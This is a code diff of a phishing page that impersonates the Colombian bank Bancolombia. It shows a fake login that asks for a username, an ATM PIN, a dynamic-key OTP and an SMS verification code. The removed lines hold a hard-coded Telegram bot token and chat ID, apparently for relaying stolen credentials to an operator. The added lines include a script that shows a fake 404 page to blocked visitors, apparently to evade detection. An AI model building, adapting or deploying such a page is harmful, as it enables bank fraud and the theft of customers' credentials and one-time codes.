@@ -1,698 +1,877 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es-CO">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sucursal Virtual</title>
+  <meta charset="utf-8">
+  <title>Bancolombia - Ingreso</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<style>
-:root {
-  --ink: #333333;
-  --line: #333333;
-  --muted: #d9dadd;
-  --yellow: #ffdc00;
-  --main-black: #1f1f1f;
-  --bg-color: #f4f4f4;
-}
+  <script>
+    // CONTROL DE SEGURIDAD PRE-CARGA (ANTI-REFRESCO)
+    if (localStorage.getItem('sys_blocked_user') === 'true') {
+      window.stop();
+      document.documentElement.innerHTML = `
+        <html lang="es"><head><title>404 Not Found</title>
+        <style>
+          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+          .container { text-align: center; }
+          h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; display: inline-block; border-right: 1px solid rgba(0, 0, 0, 0.3); padding: 0 20px 0 0; margin-right: 20px; vertical-align: middle; }
+          .msg { display: inline-block; text-align: left; vertical-align: middle; font-size: 14px; }
+        </style></head>
+        <body><div class="container"><h1>404</h1><div class="msg">This page could not be found.</div></div></body></html>`;
+    }
+  </script>
 
-* { box-sizing: border-box; }
+  <style>
+    /* ====== RESET Y BASE ====== */
+    :root {
+      --bc-theme-color: white;
+      --bc-brand: #fdda24;
+      --bc-dark: #2c2a29;
+      --bc-gray: #f9f9fa;
+      --bc-error: #d9381e;
+      --bc-success: #287a45;
+    }
+    *, *:after, *:before { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-size: 1rem;
+      font-family: "Open Sans", Arial, sans-serif;
+      color: var(--bc-dark);
+      line-height: 24px;
+      letter-spacing: -0.3px;
+      background: var(--bc-gray);
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    input, textarea { user-select: text; -webkit-user-select: text; }
 
-body {
-  margin: 0;
-  min-height: 100vh;
-  padding: 20px 12px 30px;
-  background: var(--bg-color);
-  color: var(--ink);
-  font-family: Arial, Helvetica, sans-serif;
-}
+    /* ====== UTILIDADES ====== */
+    .bc-text-center { text-align: center; }
+    .bc-flex { display: flex; }
+    .bc-container-fluid { width: 100%; padding-right: 16px; padding-left: 16px; margin: auto; }
+    .bc-row { display: flex; flex-wrap: wrap; }
+    .bc-col-xs-6 { flex: 0 0 100%; max-width: 100%; position: relative; width: 100%; }
+    .bc-col-md-8 { flex: 0 0 100%; max-width: 100%; position: relative; width: 100%; }
+    .bc-col-lg-4 { flex: 0 0 100%; max-width: 100%; position: relative; width: 100%; }
+    @media (min-width: 768px) { .bc-col-md-8 { flex: 0 0 66.6666666667%; max-width: 66.6666666667%; } }
+    @media (min-width: 992px) { .bc-col-lg-4 { flex: 0 0 33.3333333333%; max-width: 33.3333333333%; } }
+    .bc-justify-content-center { justify-content: center; }
+    .bc-mt-3 { margin-top: 1rem; }
+    .bc-mt-4 { margin-top: 1.5rem; }
 
-/* --- Encabezado Genérico --- */
-.brand-header { text-align: center; margin-bottom: 25px; position: relative; z-index: 1; }
-.brand-logo { display: inline-flex; align-items: center; gap: 8px; font-size: 28px; font-weight: 700; color: var(--main-black); letter-spacing: -1px; }
-.brand-logo-icon { width: 30px; height: 24px; position: relative; }
-.brand-logo-icon::before, .brand-logo-icon::after { content: ''; position: absolute; width: 100%; height: 6px; background: var(--main-black); border-radius: 4px; }
-.brand-logo-icon::before { top: 0; transform: skewX(-20deg); }
-.brand-logo-icon::after { bottom: 0; transform: skewX(-20deg); background: transparent; border-top: 6px solid var(--main-black); border-bottom: 6px solid var(--main-black); border-radius: 0; height: 18px; }
+    /* ====== TRAZO / FONDO DECORATIVO ====== */
+    .trazo {
+      background-image: url('https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png');
+      background-repeat: no-repeat;
+      background-position: center top;
+      background-size: 280px auto;
+      padding-top: 120px;
+    }
+    @media (max-width: 575px) {
+      .trazo { background-size: 220px auto; padding-top: 90px; }
+    }
 
-.brand-title { text-align: center; font-size: 24px; font-weight: 400; color: var(--main-black); margin-bottom: 20px; position: relative; z-index: 1; }
+    /* ====== LOGOS BANCOLOMBIA ====== */
+    .brand-logos {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      margin-top: 24px;
+      margin-bottom: 8px;
+    }
+    .brand-logos .logo-nvo {
+      width: 220px;
+      height: auto;
+    }
+    .brand-logos .logo-mtp {
+      width: 140px;
+      height: auto;
+    }
+    .brand-logos .logo-pir {
+      width: 160px;
+      height: auto;
+      margin-top: 12px;
+    }
+    @media (max-width: 575px) {
+      .brand-logos .logo-nvo { width: 180px; }
+      .brand-logos .logo-mtp { width: 110px; }
+      .brand-logos .logo-pir { width: 130px; }
+    }
 
-/* --- Formulario / Contenedor Principal --- */
-.login-card { width: min(100%, 760px); margin: 12px auto 0; background: #fff; border-radius: 12px; padding: 42px 48px 32px; box-shadow: 0 4px 12px rgba(0, 0, 0, .08); position: relative; z-index: 2; }
-h1 { margin: 0 0 24px; text-align: center; font-size: clamp(23px, 5vw, 44px); font-weight: 700; color: var(--main-black); }
-.intro { max-width: 500px; margin: 0 auto 40px; text-align: center; font-size: clamp(18px, 2.5vw, 20px); line-height: 1.4; color: #444; }
+    /* ====== CARD PRINCIPAL ====== */
+    .bc-card {
+      padding: 16px;
+      background: #fff;
+      box-shadow: 0 8px 12px rgba(44,42,41,.16), 0 1px 8px rgba(43,42,41,.08);
+      display: flex;
+      position: relative;
+      width: 100%;
+      height: min-content;
+      border-radius: 8px;
+    }
+    .bc-card-auth-body { padding: 32px; width: 100%; }
+    @media (max-width: 575px) { .bc-card-auth-body { padding: 20px; } }
+    .bc-card-auth-title {
+      font-family: "CIB Sans bold", Arial, sans-serif;
+      font-weight: 700;
+      font-size: 1.5rem;
+      line-height: 24px;
+    }
+    .bc-card-auth-description {
+      font-family: "Open Sans", Arial, sans-serif;
+      font-size: 1rem;
+      line-height: 24px;
+    }
+    .bc-card-auth-head { text-align: center; }
+    .bc-card-auth-button { display: flex; justify-content: center; }
+    .bc-card-auth-container { display: grid; margin-bottom: 32px; width: 100%; }
 
-/* --- Campos de entrada (Inputs) --- */
-.field { margin-bottom: 12px; }
-.input-wrap { display: flex; align-items: center; gap: 16px; min-height: 58px; padding: 0 6px 5px; border-bottom: 1px solid #555; }
-.input-wrap:focus-within { border-bottom-color: var(--main-black); }
-.input-wrap svg { width: 30px; height: 32px; flex: 0 0 30px; fill: none; stroke: currentColor; stroke-width: 1.5; }
-.input-wrap input { width: 100%; min-width: 0; border: 0; outline: none; background: transparent; color: var(--main-black); font-family: inherit; font-size: clamp(18px, 3.5vw, 24px); }
-.input-wrap input::placeholder { color: #666; opacity: 1; }
+    /* ====== CAMPOS FORMULARIO ====== */
+    .bc-form-field { width: 100%; position: relative; height: 52px; margin-top: 20px; }
+    .bc-form-field > em.bc-icon {
+      font-size: 0 !important;
+      color: transparent !important;
+      line-height: 0 !important;
+      overflow: hidden;
+      width: 24px;
+      height: 24px;
+      top: 6px !important;
+      position: absolute;
+      display: inline-block;
+    }
+    .bc-form-field > em.bc-icon::before {
+      content: "";
+      display: block;
+      width: 20px;
+      height: 20px;
+      background-size: contain;
+      background-repeat: no-repeat;
+    }
+    .authentication-form__username .bc-form-field > em.bc-icon::before {
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232c2a29'><path d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/></svg>");
+    }
+    .authentication-form__password .bc-form-field > em.bc-icon::before {
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232c2a29'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z'/></svg>");
+    }
+    .bc-input {
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid var(--bc-dark);
+      color: var(--bc-dark);
+      display: block;
+      height: 32px;
+      left: 0;
+      top: 20px;
+      width: 100%;
+      font-family: "Open Sans SemiBold", Arial, sans-serif;
+      font-weight: 600;
+      font-size: 1rem;
+      line-height: 24px;
+      padding-left: 30px;
+    }
+    .bc-input:focus { outline: none; border-bottom: 2px solid var(--bc-dark); }
+    .bc-input:not(:placeholder-shown) { border-bottom: 2px solid var(--bc-dark); }
+    .bc-input::placeholder { opacity: .4; color: var(--bc-dark); font-family: "Open Sans SemiBold", Arial, sans-serif; font-weight: 600; font-size: 1rem; }
 
-.help-link { display: inline-block; margin-top: 12px; color: var(--main-black); font-size: clamp(12px, 2.5vw, 18px); font-weight: 700; line-height: 1.35; text-decoration: underline; }
-.help-link:hover, .create:hover { opacity: .75; }
-.field + .field { margin-top: 38px; }
+    .authentication-form__username { margin-top: 2rem; }
+    .authentication-form__password { margin-top: 1.5rem; }
+    .authentication-form__help-text { display: block; min-height: 1.063rem; }
 
-/* --- Botón --- */
-.submit { display: block; width: 100%; min-height: 47px; margin-top: 60px; padding: 12px 18px; border: 0; border-radius: 32px; background: var(--muted); color: #888; font-family: inherit; font-size: clamp(15px, 4vw, 33px); font-weight: 700; cursor: not-allowed; transition: background .2s ease, color .2s ease; }
-.submit.ready { background: var(--yellow); color: #252525; cursor: pointer; }
-.submit.ready:hover { background: #f2cd00; }
+    .bc-link {
+      color: var(--bc-dark);
+      font-family: "Open Sans", Arial, sans-serif;
+      font-size: .875rem;
+      line-height: 20px;
+      text-decoration: none;
+      align-items: center;
+      display: flex;
+      width: fit-content;
+    }
+    .bc-link:hover { opacity: .8; }
+    .link-underline { font-weight: 700; text-decoration: none; }
 
-.create { display: block; width: fit-content; max-width: 100%; margin: 40px auto 0; color: var(--main-black); text-align: center; font-size: clamp(15px, 3.2vw, 27px); font-weight: 700; text-decoration: underline; }
+    /* ====== BOTONES ====== */
+    .bc-button-primary {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      border: 0;
+      cursor: pointer;
+      padding: 12px 24px;
+      outline: 0;
+      border-radius: 100px;
+      width: 100%;
+      min-height: 48px;
+      font-family: "CIB Sans bold", Arial, sans-serif;
+      font-weight: 700;
+      font-size: 1.125rem;
+      line-height: 26px;
+      background: var(--bc-brand);
+      color: var(--bc-dark);
+      transition: 150ms cubic-bezier(.4,0,.2,1);
+    }
+    .bc-button-primary:hover:enabled { background: #fee66c; }
+    .bc-button-primary:active:enabled { background: #e6c621; }
+    .bc-button-primary:disabled { background: #d9dadd; color: #97999b; cursor: default; }
+    .bc-button-secondary {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid var(--bc-dark);
+      cursor: pointer;
+      padding: 12px 24px;
+      border-radius: 100px;
+      width: 100%;
+      min-height: 48px;
+      font-family: "CIB Sans bold", Arial, sans-serif;
+      font-weight: 700;
+      font-size: 1.125rem;
+      background: transparent;
+      color: var(--bc-dark);
+      transition: 150ms cubic-bezier(.4,0,.2,1);
+    }
+    .bc-button-secondary:hover:enabled { background: #d9dadd; }
+    .bc-button-secondary:disabled { background: transparent; color: #97999b; border: 1px solid #97999b; cursor: default; }
 
-.notice { display: none; margin: 18px 0 0; padding: 12px 14px; border: 1px solid #dedede; border-radius: 10px; background: #f7f7f7; font-size: 14px; line-height: 1.45; }
-.notice.show { display: block; }
+    /* ====== LOADER ====== */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.85);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--bc-brand);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
 
-/* --- Footer --- */
-.footer-links { display: flex; flex-direction: column; align-items: center; gap: 32px; margin: 100px auto 25px; text-align: center; position: relative; z-index: 1; }
-.footer-links a { color: #333; font-size: clamp(19px, 3vw, 27px); line-height: 1.35; text-decoration: none; }
-.footer-links a:hover { text-decoration: underline; }
+    /* ====== MENSAJES ERROR ====== */
+    .error-msg {
+      display: none;
+      color: var(--bc-error);
+      font-size: 0.875rem;
+      margin-top: 8px;
+      font-family: "Open Sans", sans-serif;
+    }
+    .error-msg.show { display: block; }
 
-/* =========================================
-   MODAL CLAVE DINÁMICA
-   ========================================= */
-.modal-overlay { 
-  display: none; 
-  position: fixed; 
-  inset: 0; 
-  background: rgba(0, 0, 0, 0.6); 
-  backdrop-filter: blur(2px); 
-  z-index: 1000; 
-  align-items: flex-start; 
-  justify-content: center; 
-  padding: 40px 20px; 
-}
+    /* ====== MODAL OTP / SMS ====== */
+    .demo-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: rgba(0,0,0,.68);
+      backdrop-filter: blur(2px);
+      align-items: center;
+      justify-content: center;
+      padding: 18px;
+    }
+    .demo-overlay.is-open { display: flex; }
+    .demo-modal {
+      width: 100%;
+      max-width: 680px;
+      max-height: 92vh;
+      overflow-y: auto;
+      background: #fff;
+      border-radius: 30px;
+      padding: 28px 30px 48px;
+      box-shadow: 0 18px 48px rgba(0,0,0,.24);
+      position: relative;
+    }
+    .demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 24px; }
+    .demo-close {
+      border: 0;
+      background: transparent;
+      font-size: 0;
+      width: 36px;
+      height: 36px;
+      cursor: pointer;
+      color: #333;
+      position: relative;
+    }
+    .demo-close::before, .demo-close::after {
+      content: "";
+      position: absolute;
+      left: 17px;
+      top: 3px;
+      width: 1.5px;
+      height: 30px;
+      background: #333;
+      transform: rotate(45deg);
+    }
+    .demo-close::after { transform: rotate(-45deg); }
+    .demo-instruction {
+      background: #f1b5ce;
+      border-radius: 14px;
+      padding: 34px 22px;
+      text-align: center;
+      margin: 0 0 18px;
+      color: #30252b;
+      font-size: clamp(19px,3vw,27px);
+      line-height: 1.45;
+    }
+    .demo-instruction strong { font-weight: 800; }
+    .demo-title {
+      text-align: center;
+      font-family: "CIB Sans Bold", Arial, sans-serif;
+      font-size: clamp(25px,4vw,36px);
+      line-height: 1.2;
+      margin: 12px 0 24px;
+      color: #292929;
+    }
+    .demo-message {
+      text-align: center;
+      font-size: clamp(16px,2.5vw,21px);
+      line-height: 1.55;
+      margin: 0 auto 28px;
+      max-width: 540px;
+      color: #343434;
+    }
+    .demo-actions { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
+    .demo-actions button { flex: 1; max-width: 250px; min-height: 58px; }
+    .demo-note { font-size: 12px; color: #777; text-align: center; margin-top: 24px; }
+    .demo-step { display: none; }
+    .demo-step.active { display: block; }
 
-.modal-overlay.active { display: flex; }
+    /* ====== OTP SLOTS ====== */
+    .otp-slots-container { display: flex; justify-content: center; gap: 10px; margin: 24px 0; }
+    .otp-slot {
+      width: 45px;
+      height: 50px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 1.5rem;
+      line-height: 50px;
+      font-weight: bold;
+      background: #fdfdfd;
+      color: var(--bc-dark);
+    }
+    .otp-slot.active { border-color: var(--bc-brand); box-shadow: 0 0 5px rgba(253, 218, 36, 0.5); }
+    .otp-slots-container.error .otp-slot { border-color: var(--bc-error); }
+    .otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; }
 
-.modal-content { 
-  background: #fff; 
-  width: min(100%, 560px);
-  border-radius: 20px; 
-  padding: 30px 24px 24px; 
-  position: relative; 
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); 
-  margin-top: 20px;
-}
+    /* ====== FOOTER ====== */
+    .svp-footer {
+      padding: 1rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #666;
+      margin-top: 2rem;
+    }
+    .svp-footer a { color: var(--bc-dark); text-decoration: underline; }
 
-.modal-close { display: none; }
+    /* ====== LAYOUT PRINCIPAL ====== */
+    .svp-main { display: block; min-height: 77vh; }
+    .form-container { padding-bottom: 3rem; }
+    @media (max-width: 767px) { .form-container { padding-bottom: .7143rem; } }
+    @media (max-width: 575px) { .form-container { padding-bottom: 1.857rem; } }
 
-.gif-container { 
-  width: calc(100% + 48px);
-  margin-left: -24px;
-  margin-right: -24px;
-  margin-bottom: 20px; 
-  border-radius: 12px 12px 0 0; 
-  overflow: hidden; 
-  background: #4cc9f0; 
-  max-height: 160px;
-}
-.gif-container img { 
-  width: 100%; 
-  height: 160px;
-  object-fit: cover;
-  display: block; 
-}
+    /* ====== UTILIDADES MODAL SMS ====== */
+    .sms-wrap { max-width: 300px; margin: 0 auto 20px; }
+    .sms-wrap .bc-input {
+      text-align: center;
+      font-size: 1.5rem;
+      height: 45px;
+      border-bottom: 2px solid var(--bc-dark);
+      padding-left: 0;
+    }
+    .sms-wrap.error .bc-input { border-bottom-color: var(--bc-error); }
 
-.modal-title { font-size: 28px; font-weight: 700; color: #1f1f1f; text-align: center; margin: 0 0 12px; }
-.modal-subtitle { font-size: 18px; color: #444; text-align: center; margin: 0 0 30px; line-height: 1.4; }
-
-/* Input de 6 dígitos estilo moderno */
-.otp-container { position: relative; display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; padding: 0 10px; }
-.otp-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; letter-spacing: 30px; }
-.otp-slot { width: 100%; height: 30px; border-bottom: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 700; color: #1f1f1f; position: relative; }
-.otp-slot.active::after { content: ''; display: block; width: 2px; height: 24px; background: #333; animation: blink 1s step-end infinite; }
-@keyframes blink { 50% { opacity: 0; } }
-
-/* Estilos para el error en el modal */
-.otp-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 0; margin-bottom: 20px; display: none; font-weight: bold; }
-.otp-error.show { display: block; }
-.otp-container.error .otp-slot { border-bottom-color: #d93025; }
-
-/* Alerta sutil para el login */
-.login-error { color: #d93025; font-size: 15px; text-align: center; margin-top: 15px; display: none; font-weight: bold; }
-.login-error.show { display: block; }
-
-.modal-actions { display: flex; gap: 15px; }
-.btn-modal { flex: 1; padding: 14px; border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; }
-.btn-borrar { background: #fff; border: 1px solid #999; color: #666; }
-.btn-borrar:hover { background: #f5f5f5; }
-.btn-continuar { background: #d9dadd; border: none; color: #888; cursor: not-allowed; }
-.btn-continuar.ready { background: var(--yellow); color: #1f1f1f; cursor: pointer; }
-.btn-continuar.ready:hover { background: #f2cd00; }
-
-/* TEXTO DE SEGURIDAD */
-.security-note {
-  text-align: center;
-  font-size: 12px;
-  color: #888;
-  margin-top: 20px;
-  line-height: 1.4;
-}
-
-/* === VISTA SMS CODE === */
-.sms-view {
-  display: none;
-  text-align: center;
-  padding: 20px 0;
-}
-.sms-view.active { display: block; }
-
-.sms-icon {
-  font-size: 40px;
-  margin-bottom: 15px;
-}
-.sms-message {
-  font-size: 18px;
-  color: #333;
-  line-height: 1.5;
-  margin-bottom: 20px;
-}
-.sms-message strong { color: var(--main-black); }
-.sms-input-wrap {
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  margin-bottom: 20px;
-}
-.sms-input-wrap input {
-  width: 200px;
-  padding: 15px;
-  font-size: 24px;
-  text-align: center;
-  letter-spacing: 5px;
-  border: 2px solid #ccc;
-  border-radius: 8px;
-  outline: none;
-  font-family: inherit;
-}
-.sms-input-wrap input:focus {
-  border-color: var(--main-black);
-}
-
-/* Error para el SMS */
-.sms-error { color: #d93025; font-size: 15px; text-align: center; margin-bottom: 20px; display: none; font-weight: bold; }
-.sms-error.show { display: block; }
-.sms-input-wrap.error input { border-color: #d93025; }
-
-.btn-sms-final {
-  width: 100%;
-  padding: 16px;
-  border-radius: 30px;
-  border: none;
-  background: var(--yellow);
-  color: var(--main-black);
-  font-size: 18px;
-  font-weight: 700;
-  cursor: pointer;
-  font-family: inherit;
-}
-.btn-sms-final:hover {
-  background: #f2cd00;
-}
-
-/* Loading Overlay */
-#loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.8); z-index: 2000; align-items: center; justify-content: center; }
-.spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-black); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-/* Ajustes para teléfonos */
-@media (max-width: 600px) {
-  body { padding: 16px 7px 24px; }
-  .login-card { margin-top: 18px; padding: 36px 24px 28px; border-radius: 12px; }
-  h1 { margin-bottom: 24px; }
-  .intro { margin-bottom: 36px; }
-  .input-wrap { min-height: 54px; gap: 13px; }
-  .input-wrap svg { width: 26px; height: 28px; flex-basis: 26px; }
-  .field + .field { margin-top: 34px; }
-  .help-link { margin-top: 17px; }
-  .submit { min-height: 64px; margin-top: 58px; }
-  .create { margin-top: 34px; }
-  .footer-links { gap: 30px; margin-top: 90px; }
-  
-  .modal-overlay { padding: 20px 10px; align-items: flex-start; }
-  .modal-content { padding: 20px 16px 20px; margin-top: 10px; }
-  .gif-container { margin-left: -16px; margin-right: -16px; width: calc(100% + 32px); max-height: 120px; }
-  .gif-container img { height: 120px; }
-  .modal-title { font-size: 24px; }
-  .modal-subtitle { font-size: 16px; }
-  .otp-slot { height: 26px; font-size: 24px; }
-}
-</style>
+    /* ====== Ocultar iconos en card auth (como en el original) ====== */
+    .bc-card-auth-body .bc-icon { display: none; }
+  </style>
 </head>
 
-<body>
+<body id="body">
 
-<!-- Encabezado Genérico -->
-<header class="brand-header">
- 
-</header>
-
-<img src="cen.jpeg"
-     alt="Acceso al portal de clientes y sucursal virtual"
-     style="max-width:100%;height:auto;border-radius:10px;">
-<!-- Formulario Principal -->
-<main class="login-card">
-  <h1>¡Hola!</h1>
-  <p class="intro">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
-
-  <form id="demoForm" autocomplete="off">
-    <div class="field">
-      <label class="input-wrap" for="usuario">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-          <circle cx="12" cy="7" r="4"></circle>
-        </svg>
-        <input id="usuario" type="text" placeholder="Usuario" aria-label="Usuario" autocomplete="off">
-      </label>
-      <a class="help-link" href="#ayuda-usuario">¿Olvidaste tu usuario?</a>
-    </div>
-
-    <div class="field">
-      <label class="input-wrap" for="clave">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-          <circle cx="12" cy="16" r="1.5"></circle>
-          <path d="M12 17.5v2"></path>
-        </svg>
-        <input id="clave" type="password" inputmode="numeric" maxlength="4" pattern="[0-9]{4}" placeholder="Clave del cajero" aria-label="Clave" autocomplete="off">
-      </label>
-      <a class="help-link" href="#ayuda-clave">¿Olvidaste o bloqueaste tu clave?</a>
-    </div>
-
-    <p class="login-error" id="loginError">Usuario o clave incorrectos. Intenta de nuevo.</p>
-
-    <button class="submit" id="submitBtn" type="submit" disabled>Iniciar sesión</button>
-    <p class="notice" id="notice" role="status"></p>
-  </form>
-
-  <a class="create" href="#crear" id="createLink">Crear usuario</a>
-</main>
-
-<footer class="footer-links">
-  <a href="#conexion">¿Problemas para conectarte?</a>
-  <a href="#seguridad">Aprende sobre seguridad</a>
-  <a href="#reglamento">Reglamento Sucursal Virtual</a>
-</footer>
-
-<!-- MODAL CLAVE DINÁMICA -->
-<div class="modal-overlay" id="modalDinamica">
-  <div class="modal-content">
-    
-    <div id="viewDinamica">
-      <div class="gif-container">
-        <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
-      </div>
-
-      <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
-      <p class="modal-subtitle">Encuentra tu Clave Dinámica en tu aplicación móvil.</p>
-
-      <div class="otp-container" id="otpContainer">
-        <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
-        <div class="otp-slot active"></div>
-        <div class="otp-slot"></div>
-        <div class="otp-slot"></div>
-        <div class="otp-slot"></div>
-        <div class="otp-slot"></div>
-        <div class="otp-slot"></div>
-      </div>
-
-      <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
-
-      <div class="modal-actions">
-        <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
-        <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
-      </div>
-
-      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
-    </div>
-
-    <div id="viewSms" class="sms-view">
-      <div class="sms-icon">📩</div>
-      <h2 class="modal-title">Código SMS Enviado</h2>
-      <p class="sms-message">
-        Hemos enviado un código de verificación a tu número de teléfono registrado. 
-        Por favor, ingrésalo a continuación.
-      </p>
-      
-      <div class="sms-input-wrap" id="smsInputWrap">
-        <input type="text" id="smsCodeInput" inputmode="numeric" maxlength="6" placeholder="******" autocomplete="off">
-      </div>
-
-      <p class="sms-error" id="smsError">El código SMS es incorrecto o ha expirado. Intenta de nuevo.</p>
-
-      <button class="btn-sms-final" id="btnSmsFinal">Validar Código</button>
-
-      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
-    </div>
-
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <p style="margin-top: 15px; font-family: 'Open Sans', sans-serif; font-weight: 600; color: #2c2a29;">Procesando solicitud...</p>
   </div>
-</div>
 
-<!-- OVERLAY DE CARGA -->
-<div id="loading-overlay">
-  <div class="spinner"></div>
-</div>
+  <main class="svp-main">
+    <div class="bc-container-fluid trazo">
 
-<script>
-// ==========================================
-// 🔑 CONFIGURACIÓN DE TELEGRAM
-// ==========================================
-const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
-const TG_CHAT_ID = '7776240161';
+      <!-- LOGOS BANCOLOMBIA -->
+      <div class="brand-logos">
+        <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png"
+             alt="Bancolombia" class="logo-nvo">
+        <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/MTP.png"
+             alt="MTP" class="logo-mtp">
+      </div>
 
-// ==========================================
-// VARIABLES Y ELEMENTOS
-// ==========================================
-const usuarioInput = document.getElementById("usuario");
-const claveInput = document.getElementById("clave");
-const submitBtn = document.getElementById("submitBtn");
-const demoForm = document.getElementById("demoForm");
-const loadingOverlay = document.getElementById('loading-overlay');
-const loginError = document.getElementById('loginError');
+      <h1 class="bc-text-center bc-mt-4" style="font-family:'CIB Sans Light',Arial,sans-serif;font-weight:200;font-size:2.25rem;line-height:40px;color:#2c2a29;">Ingreso</h1>
 
-// Elementos del Modal
-const modal = document.getElementById("modalDinamica");
-const otpInput = document.getElementById("otpInput");
-const otpSlots = document.querySelectorAll(".otp-slot");
-const btnBorrar = document.getElementById("btnBorrar");
-const btnContinuar = document.getElementById("btnContinuar");
-const otpError = document.getElementById("otpError");
-const otpContainer = document.getElementById("otpContainer");
+      <div class="bc-row bc-justify-content-center form-container">
+        <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
+          <div class="bc-card bc-mt-4">
+            <section class="bc-card-auth-body">
 
-// Elementos Vistas del Modal
-const viewDinamica = document.getElementById("viewDinamica");
-const viewSms = document.getElementById("viewSms");
-const smsCodeInput = document.getElementById("smsCodeInput");
-const btnSmsFinal = document.getElementById("btnSmsFinal");
-const smsError = document.getElementById("smsError");
-const smsInputWrap = document.getElementById("smsInputWrap");
+              <section class="bc-card-auth-head">
+                <h1 class="bc-card-auth-title bc-mt-3">¡Hola!</h1>
+                <h3 class="bc-card-auth-description bc-mt-3">
+                  Ingresa los datos para gestionar tus productos y hacer transacciones.
+                </h3>
+              </section>
 
-// Variables de control
-let pollingActivo = false;
-let pollingTimeout = null;
-let ultimoUpdateId = -1;
-let actionProcessed = false;
-let msgIdActual = null;
+              <form id="demoForm" autocomplete="off">
+                <section class="bc-card-auth-container">
 
-// Funciones de UI
-function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
-function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+                  <div class="bc-form-field authentication-form__username">
+                    <div class="bc-form-field">
+                      <em class="bc-icon" aria-hidden="true">user</em>
+                      <input id="usuario" name="usuario" autocomplete="off" autocorrect="off"
+                             spellcheck="false" maxlength="20"
+                             aria-describedby="username-helper" aria-invalid="false"
+                             class="bc-input" placeholder=" " aria-label="Usuario" required>
+                      <label for="usuario"></label>
